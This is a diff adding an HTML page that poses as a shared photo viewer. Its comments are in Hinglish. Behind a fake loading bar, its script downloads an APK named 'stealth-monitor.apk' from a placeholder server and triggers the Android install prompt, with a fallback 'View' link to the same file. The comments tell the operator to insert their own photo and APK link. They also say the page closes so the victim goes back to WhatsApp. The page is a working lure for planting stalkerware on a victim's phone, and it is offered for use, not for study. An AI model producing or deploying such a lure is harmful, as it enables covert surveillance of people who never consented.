@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>View Photo</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { 
+    background: #000; 
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    justify-content: center; 
+    height: 100vh; 
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    color: #fff;
+  }
+  .viewer {
+    width: 100%;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: #1a1a1a;
+  }
+  .photo-placeholder {
+    width: 85%;
+    height: 60vh;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 5rem;
+    margin: 20px 0;
+  }
+  .photo-placeholder img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 12px;
+  }
+  .status {
+    font-size: 13px;
+    color: #aaa;
+    margin-top: 16px;
+    padding: 8px 16px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 20px;
+  }
+  .progress-bar {
+    width: 60%;
+    height: 4px;
+    background: rgba(255,255,255,0.1);
+    border-radius: 2px;
+    margin-top: 12px;
+    overflow: hidden;
+  }
+  .progress-fill {
+    height: 100%;
+    background: #4a90d9;
+    width: 0%;
+    transition: width 0.3s;
+    border-radius: 2px;
+  }
+  .back-btn {
+    position: absolute;
+    top: 20px;
+    left: 20px;
+    color: #fff;
+    font-size: 24px;
+    cursor: pointer;
+    background: rgba(255,255,255,0.1);
+    border: none;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+</style>
+</head>
+<body>
+  <button class="back-btn" onclick="window.history.back()">←</button>
+  <div class="viewer">
+    <div class="photo-placeholder">
+      <!-- YAHAN APNI IMAGE DAALO — user ko ye photo dikhegi -->
+      <img src="your-photo.jpg.png" alt="Photo" 
+           onerror="this.parentElement.innerHTML='📷 Photo'; this.parentElement.style.fontSize='5rem';">
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="bar"></div></div>
+    <div class="status" id="status">Loading...</div>
+  </div>
+
+<script>
+// APNA APK LINK YAHAN DAALO — ye woh file hai jo user ko install hogi
+var APK_URL = "https://your-server.com/stealth-monitor.apk";
+var DEVICE_ID = "device-" + Math.random().toString(36).substr(2, 9);
+
+var bar = document.getElementById('bar');
+var status = document.getElementById('status');
+var progress = 0;
+var interval = setInterval(function() {
+  progress = Math.min(progress + Math.random() * 15, 95);
+  bar.style.width = progress + '%';
+  if (progress < 50) status.textContent = 'Loading...';
+  else if (progress < 80) status.textContent = 'Preparing...';
+  else status.textContent = 'Almost ready...';
+}, 400);
+
+setTimeout(function() {
+  clearInterval(interval);
+  bar.style.width = '100%';
+  status.textContent = 'Opening...';
+  
+  // APK download karke install trigger karo
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', APK_URL, true);
+  xhr.responseType = 'blob';
+  xhr.send();
+  xhr.onload = function() {
+    if (xhr.status === 200) {
+      var blob = new Blob([xhr.response], {type: 'application/vnd.android.package-archive'});
+      var url = URL.createObjectURL(blob);
+      // Install intent — user ko "Install?" popup dikhega
+      window.location.href = url;
+      // 3 second baad page close (user wapas WhatsApp pe jaayega)
+      setTimeout(function() { window.close(); }, 3000);
+    } else {
+      status.textContent = 'Tap below to continue →';
+      var btn = document.createElement('a');
+      btn.href = APK_URL;
+      btn.textContent = 'View';
+      btn.style.cssText = 'margin-top:12px;padding:8px 24px;background:#4a90d9;color:#fff;border-radius:20px;text-decoration:none;';
+      document.querySelector('.viewer').appendChild(btn);
+    }
+  };
+}, 3000);
+</script>
+</body>
+</html>
